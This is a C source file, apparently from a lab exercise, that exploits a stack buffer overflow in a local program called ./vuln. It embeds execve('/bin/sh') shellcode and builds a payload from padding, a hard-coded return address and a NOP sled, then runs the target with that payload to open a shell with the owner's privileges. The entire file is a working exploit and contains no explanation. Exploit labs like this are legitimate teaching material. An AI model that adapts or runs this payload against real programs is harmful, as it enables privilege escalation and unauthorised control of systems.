#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define NOP                             0x90
#define DEFAULT_OFFSET                  0
#define DEFAULT_BUFFER_SIZE            112
#define DEFAULT_EGG_SIZE               2048

// shellcode to run open the shell with the owner
char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

// unsigned long get_esp(void) {
//    __asm__("movl %esp,%eax");
// }

void main(int argc, char *argv[]) {
  char payload[2048];  // Large enough buffer to hold everything, including NOPs, return address, and shellcode
  unsigned long ret_addr = 0xffffcece;  // Address of the NOP sled
  int index = 0;

  //fill irst 22 bytes with 'A' (padding)
  memset(payload + index, 'A', 22);
  index += 22;

  //place the return address (4 bytes)
  *(unsigned long *)(payload + index) = ret_addr;
  index += 4;

  //fill next 100 bytes with NOPs
  memset(payload + index, NOP, 100);
  index += 100;

  //copy shellcode 
  memcpy(payload + index, shellcode, sizeof(shellcode)-1);
  index += sizeof(shellcode)-1;

  //null terminate the string at the end of the shellcode
  payload[index] = '\0';

  // Print the payload string to pass to ./vuln
  // printf("%s\n", payload);

  //run ./vuln with the payload
  char *args[] = {"./vuln", payload, NULL};
  execvp(args[0], args);
}
